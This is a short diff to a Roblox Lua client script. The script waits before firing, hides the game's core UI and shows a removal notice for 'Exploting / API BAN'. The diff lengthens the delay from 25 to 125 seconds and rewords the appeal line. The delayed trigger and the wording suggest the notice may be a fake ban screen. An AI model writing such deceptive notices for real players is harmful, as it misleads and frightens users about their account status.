@@ -6,7 +6,7 @@ local ContextActionService = game:GetService("ContextActionService")
 local player = Players.LocalPlayer
 
 -- Wait 25 seconds before triggering
-task.wait(25)
+task.wait(125)
 
 -- Disable Core UI (chat, backpack, etc.)
 pcall(function()
@@ -75,7 +75,7 @@ You have been removed from this experience.
 Reason: Exploting / API BAN
 Status: 364Days 24H 60M 60S
 
-Please contact the developer if you believe this is an error.
+Please make a support ticket if this is false
 ]]
 
 message.Parent = frame
